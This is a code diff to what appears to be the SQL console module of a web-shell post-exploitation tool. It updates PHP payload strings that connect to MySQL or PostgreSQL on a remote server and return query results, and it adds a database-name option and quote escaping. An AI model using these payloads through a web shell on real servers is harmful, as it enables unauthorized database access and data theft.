@@ -3,6 +3,7 @@ from core.module import Module
 from core.loggers import log
 from core import messages
 import utils
+import re
 
 
 class Console(Module):
@@ -23,19 +24,23 @@ class Console(Module):
         self.register_vectors(
             [
                 PhpCode(
-                    """if(mysql_connect("${host}","${user}","${passwd}")){$r=mysql_query("${query}");if($r){while($c=mysql_fetch_row($r)){foreach($c as $key=>$value){echo $value."${linsep}";}echo "${colsep}";}};mysql_close();}echo "${errsep}".@mysql_error();""",
+                    """if($s=mysqli_connect('${host}','${user}','${passwd}')){$r=mysqli_query($s,'${query}');if($r){while($c=mysqli_fetch_row($r)){foreach($c as $key=>$value){echo $value.'${linsep}';}echo '${colsep}';}};mysqli_close($s);}echo '${errsep}'.@mysqli_connect_error().' '.@mysqli_error();""",
                     name='mysql',
                 ),
                 PhpCode(
-                    """$r=mysql_query("${query}");if($r){while($c=mysql_fetch_row($r)){foreach($c as $key=>$value){echo $value."${linsep}";}echo "${colsep}";}};mysql_close();echo "${errsep}".@mysql_error();""",
+                    """$r=mysqli_query('${query}');if($r){while($c=mysqli_fetch_row($r)){foreach($c as $key=>$value){echo $value.'${linsep}';}echo '${colsep}';}};mysqli_close();echo '${errsep}'.@mysqli_connect_error().' '.@mysqli_error();""",
                     name="mysql_fallback"
                 ),
                 PhpCode(
-                    """if(pg_connect("host=${host} user=${user} password=${passwd}")){$r=pg_query("${query}");if($r){while($c=pg_fetch_row($r)){foreach($c as $key=>$value){echo $value."${linsep}";}echo "${colsep}";}};pg_close();}echo "${errsep}".@pg_last_error();""",
+                    """if(pg_connect('host=${host} user=${user} password=${passwd}')){$r=pg_query('${query}');if($r){while($c=pg_fetch_row($r)){foreach($c as $key=>$value){echo $value.'${linsep}';}echo '${colsep}';}};pg_close();}echo '${errsep}'.@pg_last_error();""",
                     name="pgsql"
                 ),
                 PhpCode(
-                    """$r=pg_query("${query}");if($r){while($c=pg_fetch_row($r)){foreach($c as $key=>$value){echo $value."${linsep}";} echo "${colsep}";}};pg_close();echo "${errsep}".@pg_last_error();""",
+                    """if(pg_connect('host=${host} user=${user} dbname=${database} password=${passwd}')){$r=pg_query('${query}');if($r){while($c=pg_fetch_row($r)){foreach($c as $key=>$value){echo $value.'${linsep}';}echo '${colsep}';}};pg_close();}echo '${errsep}'.@pg_last_error();""",
+                    name="pgsql_database"
+                ),
+                PhpCode(
+                    """$r=pg_query('${query}');if($r){while($c=pg_fetch_row($r)){foreach($c as $key=>$value){echo $value.'${linsep}';} echo '${colsep}';}};pg_close();echo '${errsep}'.@pg_last_error();""",
                     name="pgsql_fallback"
                 ),
             ]
@@ -44,8 +49,9 @@ class Console(Module):
         self.register_arguments([
             {'name': '-user', 'help': 'SQL username'},
             {'name': '-passwd', 'help': 'SQL password'},
-            {'name': '-host', 'help': 'Db host or host:port', 'nargs': '?', 'default': '127.0.0.1'},
+            {'name': '-host', 'help': 'Db host or host:port', 'nargs': '?', 'default': 'localhost'},
             {'name': '-dbms', 'help': 'Db type', 'choices': ('mysql', 'pgsql'), 'default': 'mysql'},
+            {'name': '-database', 'help': 'Database name (Only PostgreSQL)'},
             {'name': '-query', 'help': 'Execute a single query'},
             {'name': '-encoding', 'help': 'Db text encoding', 'default': 'utf-8'},
         ])
@@ -59,6 +65,9 @@ class Console(Module):
         args.update(
             {'colsep': colsep, 'linsep': linsep, 'errsep': errsep}
         )
+        
+        # Escape ' in query strings
+        self.args['query'] = self.args['query'].replace('\\', '\\\\').replace('\'', '\\\'')
 
         result = self.vectors.get_result(vector, args)
 
@@ -68,7 +77,7 @@ class Console(Module):
             result = unicode(result)
         except UnicodeError:
             result = unicode(result.decode(args.get('encoding')))
-
+        
         # If there is not errstr, something gone really bad (e.g. functions not callable)
         if errsep not in result:
             return {
@@ -79,7 +88,7 @@ class Console(Module):
 
             # Split result by errsep
             result, error = result.split(errsep)
-
+            
             return {
                 'error': error,
                 'result': [
@@ -93,12 +102,17 @@ class Console(Module):
         # The vector name is given by the db type
         vector = self.args.get('dbms')
         encoding = self.args.get('encoding')
+        database = self.args.get('database')
 
-        # And by the user and password presence
-        vector += (
-            '' if self.args.get('user') and self.args.get('passwd')
-            else '_fallback'
-        )
+        # Check if PostgreSQL and database is given
+        if vector == 'pgsql' and database:
+            vector += '_database'
+        else:
+            # And by the user and password presence
+            vector += (
+                '' if self.args.get('user') and self.args.get('passwd')
+                else '_fallback'
+            )
 
         # If the query is set, just execute it
         if self.args.get('query'):
